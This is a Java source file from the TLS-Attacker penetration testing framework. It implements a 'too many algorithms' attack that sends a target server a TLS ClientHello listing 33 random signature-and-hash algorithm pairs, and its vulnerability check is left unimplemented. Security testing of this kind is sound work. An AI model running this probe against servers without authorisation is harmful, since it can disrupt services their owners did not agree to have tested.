/**
 * TLS-Attacker - A Modular Penetration Testing Framework for TLS
 *
 * Copyright 2014-2017 Ruhr University Bochum / Hackmanit GmbH
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.tlsattacker.attacks.impl;

import de.rub.nds.tlsattacker.attacks.config.TooManyAlgorithmsAttackConfig;
import de.rub.nds.tlsattacker.core.config.Config;
import de.rub.nds.tlsattacker.core.constants.HashAlgorithm;
import de.rub.nds.tlsattacker.core.constants.SignatureAlgorithm;
import de.rub.nds.tlsattacker.core.constants.SignatureAndHashAlgorithm;
import de.rub.nds.tlsattacker.core.protocol.message.ClientHelloMessage;
import de.rub.nds.tlsattacker.core.state.State;
import de.rub.nds.tlsattacker.core.workflow.DefaultWorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowExecutor;
import de.rub.nds.tlsattacker.core.workflow.WorkflowTrace;
import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
import java.util.LinkedList;
import java.util.List;
import java.util.Random;

public class TooManyAlgorithmsAttacker extends Attacker<TooManyAlgorithmsAttackConfig> {

    public TooManyAlgorithmsAttacker(TooManyAlgorithmsAttackConfig config) {
        super(config, false);
    }

    @Override
    public void executeAttack() {
        Config tlsConfig = config.createConfig();
        tlsConfig.setAddSignatureAndHashAlgrorithmsExtension(true);
        List<SignatureAndHashAlgorithm> algorithmList = new LinkedList<>();
        Random random = new Random(0);
        for (int i = 0; i < 33; i++) {
            algorithmList.add(new SignatureAndHashAlgorithm(SignatureAlgorithm.getRandom(random), HashAlgorithm
                    .getRandom(random)));
        }
        tlsConfig.setSupportedSignatureAndHashAlgorithms(algorithmList);
        WorkflowTrace trace = new WorkflowTrace();
        trace.addTlsAction(new SendAction(new ClientHelloMessage(tlsConfig)));
        WorkflowExecutor executor = new DefaultWorkflowExecutor(new State(tlsConfig, trace));
        executor.executeWorkflow();
        LOGGER.info("Executed attack");
    }

    @Override
    public Boolean isVulnerable() {
        throw new UnsupportedOperationException("Not supported yet."); // To
                                                                       // change
                                                                       // body
                                                                       // of
                                                                       // generated
                                                                       // methods,
                                                                       // choose
                                                                       // Tools
                                                                       // |
                                                                       // Templates.
    }

}
